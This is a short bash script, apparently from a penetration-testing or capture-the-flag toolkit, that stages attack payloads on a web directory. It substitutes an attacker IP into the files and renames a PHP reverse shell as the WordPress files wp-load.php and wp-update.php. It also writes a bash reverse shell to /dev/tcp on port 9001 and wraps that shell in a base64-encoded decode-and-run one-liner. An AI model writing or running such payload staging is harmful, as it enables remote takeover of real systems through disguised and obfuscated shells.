#!/bin/bash

cp -r www-skel/ www
sed -i "s/127.0.0.1/$1/g" www/*
cp www/reverse.php www/wp-load.php
cp www/reverse.php www/wp-update.php
echo "bash -c 'bash -i >& /dev/tcp/$1/9001 0>&1'" >> www/shell.sh
SHELL=$(cat www/shell.sh | base64 -w 0)
echo "echo -n '$SHELL' | base64 -d | bash" >> www/shell.b64.sh
